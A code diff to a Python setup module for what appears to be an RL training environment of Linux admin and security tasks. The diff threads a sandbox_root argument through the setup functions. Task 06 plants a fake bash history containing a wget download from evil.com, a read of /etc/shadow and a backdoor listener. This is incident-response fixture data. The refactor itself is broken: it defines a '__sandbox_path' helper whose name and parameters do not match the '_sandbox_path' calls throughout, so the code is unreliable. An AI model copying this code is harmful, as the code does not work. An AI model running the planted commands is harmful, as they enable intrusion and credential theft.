@@ -8,18 +8,24 @@ import shutil
 import platform
 from typing import Dict, Any
 
-from env.sandbox_config import sandbox_path, SANDBOX_ROOT
 
 IS_LINUX = platform.system() == "Linux"
 
-# Per-worker PID file: avoids cross-contamination in parallel RL training
-PID_FILE = f'/tmp/.openenv_pids_{os.getpid()}'
+def __sandbox_path(sandbox_root, root: str, p: str) -> str:
+    return os.path.join(root, p.lstrip('/'))
 
-def _track_pid(pid: int):
+def get_pid_file(sandbox_root: str) -> str:
+    return f'/tmp/.openenv_pids_{os.path.basename(sandbox_root)}'
+
+# Per-worker PID file: avoids cross-contamination in parallel RL training
+
+def _track_pid(pid: int, sandbox_root: str):
+    PID_FILE = get_pid_file(sandbox_root)
     with open(PID_FILE, 'a') as f:
         f.write(f"{pid}\n")
 
-def _cleanup_pids():
+def _cleanup_pids(sandbox_root: str):
+    PID_FILE = get_pid_file(sandbox_root)
     if os.path.exists(PID_FILE) and IS_LINUX:
         import signal
         with open(PID_FILE, 'r') as f:
@@ -44,7 +50,7 @@ def _cleanup_pids():
             pass
 
 
-def setup_task_01(seed: int) -> Dict[str, Any]:
+def setup_task_01(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Stale Temp Purge: create stale + recent files in /tmp."""
     random.seed(seed)
     now = time.time()
@@ -54,7 +60,7 @@ def setup_task_01(seed: int) -> Dict[str, Any]:
     stale_files = []
     for i in range(10):
         ext = random.choice(['.tmp', '.sess', '.cache', '.pid'])
-        dir_path = sandbox_path(f"/tmp/dir_{random.randint(0,2)}")
+        dir_path = _sandbox_path(sandbox_root, f"/tmp/dir_{random.randint(0,2)}")
         os.makedirs(dir_path, exist_ok=True)
         fpath = os.path.join(dir_path, f"stale_{i}{ext}")
         linux_path = f"/tmp/dir_{random.randint(0,2)}/stale_{i}{ext}"
@@ -65,7 +71,7 @@ def setup_task_01(seed: int) -> Dict[str, Any]:
 
     recent_files = []
     for i in range(3):
-        fpath = sandbox_path(f"/tmp/recent_{i}.tmp")
+        fpath = _sandbox_path(sandbox_root, f"/tmp/recent_{i}.tmp")
         os.makedirs(os.path.dirname(fpath), exist_ok=True)
         with open(fpath, 'w') as f:
             f.write("recent data")
@@ -73,7 +79,7 @@ def setup_task_01(seed: int) -> Dict[str, Any]:
         recent_files.append(fpath)
 
     # Create a protected lock file (simulates open file descriptor)
-    lock_path = sandbox_path("/tmp/session.lock")
+    lock_path = _sandbox_path(sandbox_root, "/tmp/session.lock")
     with open(lock_path, 'w') as f:
         f.write("locked by PID 1234")
 
@@ -86,25 +92,25 @@ def setup_task_01(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_02(seed: int) -> Dict[str, Any]:
+def setup_task_02(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Network Service Audit: misconfigured DNS + firewall + SSH ciphers."""
     random.seed(seed)
     port = random.choice([8080, 8443, 3000])
 
     # /etc/hosts with wrong IP for the service
-    etc = sandbox_path("/etc")
+    etc = _sandbox_path(sandbox_root, "/etc")
     os.makedirs(etc, exist_ok=True)
     with open(os.path.join(etc, "hosts"), "w") as f:
         f.write(f"127.0.0.1 localhost\n192.168.1.99 myservice.local\n")
 
     # sshd_config with weak ciphers
-    ssh_dir = sandbox_path("/etc/ssh")
+    ssh_dir = _sandbox_path(sandbox_root, "/etc/ssh")
     os.makedirs(ssh_dir, exist_ok=True)
     with open(os.path.join(ssh_dir, "sshd_config"), "w") as f:
         f.write(f"Port 22\nCiphers aes128-cbc,3des-cbc\nPermitRootLogin yes\n")
 
     # Firewall rules blocking the service port
-    fw_dir = sandbox_path("/etc/iptables")
+    fw_dir = _sandbox_path(sandbox_root, "/etc/iptables")
     os.makedirs(fw_dir, exist_ok=True)
     fw_path = os.path.join(fw_dir, "rules.v4")
     with open(fw_path, "w") as f:
@@ -123,13 +129,13 @@ def setup_task_02(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_03(seed: int) -> Dict[str, Any]:
+def setup_task_03(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """SSH Key Permissions: create a key with wrong perms."""
     random.seed(seed)
     home_dir = random.choice(['/home/alice', '/home/bob', '/home/deploy'])
     key_name = random.choice(['id_rsa', 'id_ed25519', 'deploy_key'])
 
-    key_path = sandbox_path(os.path.join(home_dir, '.ssh', key_name))
+    key_path = _sandbox_path(sandbox_root, os.path.join(home_dir, '.ssh', key_name))
     os.makedirs(os.path.dirname(key_path), exist_ok=True)
     with open(key_path, 'w') as f:
         f.write("-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_KEY_DATA\n-----END OPENSSH PRIVATE KEY-----\n")
@@ -148,11 +154,11 @@ def setup_task_03(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_07(seed: int) -> Dict[str, Any]:
+def setup_task_07(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Service Config Fix: wrong bind_address."""
     random.seed(seed)
     port = random.choice([9090, 4000, 7070])
-    config_dir = sandbox_path("/etc/myservice")
+    config_dir = _sandbox_path(sandbox_root, "/etc/myservice")
     os.makedirs(config_dir, exist_ok=True)
     config_path = os.path.join(config_dir, "myservice.conf")
     with open(config_path, 'w') as f:
@@ -167,13 +173,13 @@ def setup_task_07(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_08(seed: int) -> Dict[str, Any]:
+def setup_task_08(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """IP Ban: create access.log with attacker IP."""
     random.seed(seed)
     attacker_ip = f"192.168.1.{random.randint(100, 200)}"
     legit_ips = [f"10.0.0.{i}" for i in range(5)]
 
-    log_dir = sandbox_path("/var/log")
+    log_dir = _sandbox_path(sandbox_root, "/var/log")
     os.makedirs(log_dir, exist_ok=True)
     with open(os.path.join(log_dir, "access.log"), 'w') as f:
         for _ in range(2000):
@@ -182,7 +188,7 @@ def setup_task_08(seed: int) -> Dict[str, Any]:
             for _ in range(10):
                 f.write(f"{ip} GET /page HTTP/1.1\n")
 
-    deny_path = sandbox_path("/etc/hosts.deny")
+    deny_path = _sandbox_path(sandbox_root, "/etc/hosts.deny")
     os.makedirs(os.path.dirname(deny_path), exist_ok=True)
     with open(deny_path, 'w') as f:
         pass  # empty file
@@ -196,12 +202,12 @@ def setup_task_08(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_10(seed: int) -> Dict[str, Any]:
+def setup_task_10(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Cron Job Fix: missing execute bit + PATH."""
     random.seed(seed)
-    cron_dir = sandbox_path("/var/spool/cron/crontabs")
-    backup_dir = sandbox_path("/opt/backup")
-    bin_dir = sandbox_path("/usr/local/bin")
+    cron_dir = _sandbox_path(sandbox_root, "/var/spool/cron/crontabs")
+    backup_dir = _sandbox_path(sandbox_root, "/opt/backup")
+    bin_dir = _sandbox_path(sandbox_root, "/usr/local/bin")
     os.makedirs(cron_dir, exist_ok=True)
     os.makedirs(backup_dir, exist_ok=True)
     os.makedirs(bin_dir, exist_ok=True)
@@ -228,10 +234,10 @@ def setup_task_10(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_13(seed: int) -> Dict[str, Any]:
+def setup_task_13(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """World-Writable Fix: config files with 777."""
     random.seed(seed)
-    config_dir = sandbox_path("/etc/myapp")
+    config_dir = _sandbox_path(sandbox_root, "/etc/myapp")
     os.makedirs(config_dir, exist_ok=True)
 
     vulnerable = []
@@ -261,10 +267,10 @@ def setup_task_13(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_14(seed: int) -> Dict[str, Any]:
+def setup_task_14(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """SSH Hardening: fix sshd_config."""
     random.seed(seed)
-    ssh_dir = sandbox_path("/etc/ssh")
+    ssh_dir = _sandbox_path(sandbox_root, "/etc/ssh")
     os.makedirs(ssh_dir, exist_ok=True)
     config_path = os.path.join(ssh_dir, "sshd_config")
     with open(config_path, 'w') as f:
@@ -279,12 +285,12 @@ def setup_task_14(seed: int) -> Dict[str, Any]:
     }
 
 
-def setup_task_15(seed: int) -> Dict[str, Any]:
+def setup_task_15(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Config Drift Detection: wrong env vars + drifted config files."""
     random.seed(seed)
 
     # App config with drifted values
-    app_dir = sandbox_path("/opt/myapp")
+    app_dir = _sandbox_path(sandbox_root, "/opt/myapp")
     os.makedirs(app_dir, exist_ok=True)
     config_path = os.path.join(app_dir, "config.yaml")
     with open(config_path, "w") as f:
@@ -294,7 +300,7 @@ def setup_task_15(seed: int) -> Dict[str, Any]:
                 "max_connections: 5\n")
 
     # Gold version (what it should be)
-    gold_dir = sandbox_path("/var/lib/gold")
+    gold_dir = _sandbox_path(sandbox_root, "/var/lib/gold")
     os.makedirs(gold_dir, exist_ok=True)
     gold_path = os.path.join(gold_dir, "config.yaml")
     with open(gold_path, "w") as f:
@@ -326,10 +332,10 @@ def setup_task_15(seed: int) -> Dict[str, Any]:
 
 
 # Stub tasks for Linux-only features (4,5,6,9,11,12) — return minimal hidden state
-def _stub_task(task_id, seed):
+def _stub_task(task_id, seed, sandbox_root):
     return {"task_id": task_id, "optimal_steps": 5, "stub": True}
 
-def setup_task_04(seed: int) -> Dict[str, Any]:
+def setup_task_04(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Zombie Process Reaper."""
     random.seed(seed)
     target_parent_pid = None
@@ -353,7 +359,7 @@ def setup_task_04(seed: int) -> Dict[str, Any]:
                     f"Setup Failed: Zombie-parent process {pid} died immediately."
                 )
             target_parent_pid = pid
-            _track_pid(pid)
+            _track_pid(pid, sandbox_root)
             
     return {
         "task_id": 4,
@@ -361,10 +367,10 @@ def setup_task_04(seed: int) -> Dict[str, Any]:
         "optimal_steps": 4,
     }
 
-def setup_task_05(seed: int) -> Dict[str, Any]:
+def setup_task_05(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Port Conflict Resolution."""
     random.seed(seed)
-    target_port = random.choice([8080, 3000, 5000])
+    target_port = random.randint(10000, 60000)
     rogue_pid = None
     
     if IS_LINUX:
@@ -390,9 +396,9 @@ def setup_task_05(seed: int) -> Dict[str, Any]:
                     f"(port {target_port} may already be in use)."
                 )
             rogue_pid = pid
-            _track_pid(pid)
+            _track_pid(pid, sandbox_root)
 
-    config_dir = sandbox_path("/etc")
+    config_dir = _sandbox_path(sandbox_root, "/etc")
     os.makedirs(config_dir, exist_ok=True)
     with open(os.path.join(config_dir, "myapp.conf"), "w") as f:
         f.write(f"server_name myapp\nprot={target_port}\n")
@@ -403,13 +409,13 @@ def setup_task_05(seed: int) -> Dict[str, Any]:
         "rogue_pid": rogue_pid,
         "optimal_steps": 5,
     }
-def setup_task_06(seed: int) -> Dict[str, Any]:
+def setup_task_06(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Security Incident Response: brute-force + SUID exploit."""
     random.seed(seed)
     attacker = f"10.0.{random.randint(1,50)}.{random.randint(100,200)}"
 
     # Auth log with brute-force attempts
-    log_dir = sandbox_path("/var/log")
+    log_dir = _sandbox_path(sandbox_root, "/var/log")
     os.makedirs(log_dir, exist_ok=True)
     with open(os.path.join(log_dir, "auth.log"), "w") as f:
         for i in range(200):
@@ -419,14 +425,14 @@ def setup_task_06(seed: int) -> Dict[str, Any]:
                 f"for compromised_user from {attacker}\n")
 
     # User history with suspicious commands
-    hist_dir = sandbox_path("/home/compromised_user")
+    hist_dir = _sandbox_path(sandbox_root, "/home/compromised_user")
     os.makedirs(hist_dir, exist_ok=True)
     with open(os.path.join(hist_dir, ".bash_history"), "w") as f:
         f.write("wget http://evil.com/backdoor.sh\nchmod 4755 /tmp/backdoor\n"
                 "cat /etc/shadow\n./backdoor --listen 4444\n")
 
     # Rogue SUID binary
-    tmp_dir = sandbox_path("/tmp")
+    tmp_dir = _sandbox_path(sandbox_root, "/tmp")
     os.makedirs(tmp_dir, exist_ok=True)
     suid_path = os.path.join(tmp_dir, "backdoor")
     with open(suid_path, "w") as f:
@@ -437,13 +443,13 @@ def setup_task_06(seed: int) -> Dict[str, Any]:
         pass
 
     # Integrity manifest
-    manifest_dir = sandbox_path("/var/lib/integrity")
+    manifest_dir = _sandbox_path(sandbox_root, "/var/lib/integrity")
     os.makedirs(manifest_dir, exist_ok=True)
     with open(os.path.join(manifest_dir, "checksums.txt"), "w") as f:
         f.write("/usr/bin/passwd:OK\n/tmp/backdoor:MODIFIED\n")
 
     # /etc/passwd with compromised user having /bin/bash
-    etc_dir = sandbox_path("/etc")
+    etc_dir = _sandbox_path(sandbox_root, "/etc")
     os.makedirs(etc_dir, exist_ok=True)
     passwd_path = os.path.join(etc_dir, "passwd")
     with open(passwd_path, "w") as f:
@@ -462,7 +468,7 @@ def setup_task_06(seed: int) -> Dict[str, Any]:
         "passwd_path": passwd_path,
         "optimal_steps": 7,
     }
-def setup_task_09(seed: int) -> Dict[str, Any]:
+def setup_task_09(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Deleted-but-Open File (FD Leak)."""
     random.seed(seed)
     target_pid = None
@@ -471,7 +477,7 @@ def setup_task_09(seed: int) -> Dict[str, Any]:
         pid = os.fork()
         if pid == 0:
             # Child: open a large file, then unlink it while still holding the FD
-            log_path = sandbox_path(f"/tmp/leaked_{random.randint(1000,9999)}.log")
+            log_path = _sandbox_path(sandbox_root, f"/tmp/leaked_{random.randint(1000,9999)}.log")
             os.makedirs(os.path.dirname(log_path), exist_ok=True)
             fh = open(log_path, "w")
             fh.write("A" * (50 * 1024 * 1024))
@@ -488,7 +494,7 @@ def setup_task_09(seed: int) -> Dict[str, Any]:
                     f"Setup Failed: FD-leak process {pid} crashed immediately."
                 )
             target_pid = pid
-            _track_pid(pid)
+            _track_pid(pid, sandbox_root)
 
     return {
         "task_id": 9,
@@ -496,10 +502,10 @@ def setup_task_09(seed: int) -> Dict[str, Any]:
         "optimal_steps": 4,
     }
 
-def setup_task_11(seed: int) -> Dict[str, Any]:
+def setup_task_11(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Rogue SUID Binary Audit."""
     random.seed(seed)
-    bin_dir = sandbox_path("/usr/local/bin")
+    bin_dir = _sandbox_path(sandbox_root, "/usr/local/bin")
     os.makedirs(bin_dir, exist_ok=True)
     
     suid_file = os.path.join(bin_dir, f"helper_{random.randint(100,999)}")
@@ -517,10 +523,10 @@ def setup_task_11(seed: int) -> Dict[str, Any]:
         "optimal_steps": 3,
     }
 
-def setup_task_12(seed: int) -> Dict[str, Any]:
+def setup_task_12(seed: int, sandbox_root: str) -> Dict[str, Any]:
     """Sudoers NOPASSWD Audit."""
     random.seed(seed)
-    etc_dir = sandbox_path("/etc")
+    etc_dir = _sandbox_path(sandbox_root, "/etc")
     os.makedirs(etc_dir, exist_ok=True)
     
     sudoers_path = os.path.join(etc_dir, "sudoers")
@@ -544,12 +550,12 @@ def _force_remove_readonly(func, path, exc_info):
     func(path)
 
 
-def get_setup_for_task(task_id: int, seed: int) -> Dict[str, Any]:
-    _cleanup_pids()
+def get_setup_for_task(task_id: int, seed: int, sandbox_root: str) -> Dict[str, Any]:
+    _cleanup_pids(sandbox_root)
     # Clean sandbox before each episode
-    if os.path.exists(SANDBOX_ROOT):
-        shutil.rmtree(SANDBOX_ROOT, onerror=_force_remove_readonly)
-    os.makedirs(SANDBOX_ROOT, exist_ok=True)
+    if os.path.exists(sandbox_root):
+        shutil.rmtree(sandbox_root, onerror=_force_remove_readonly)
+    os.makedirs(sandbox_root, exist_ok=True)
 
     setups = {
         1: setup_task_01,
@@ -568,4 +574,4 @@ def get_setup_for_task(task_id: int, seed: int) -> Dict[str, Any]:
         14: setup_task_14,
         15: setup_task_15,
     }
-    return setups[task_id](seed)
+    return setups[task_id](seed, sandbox_root)
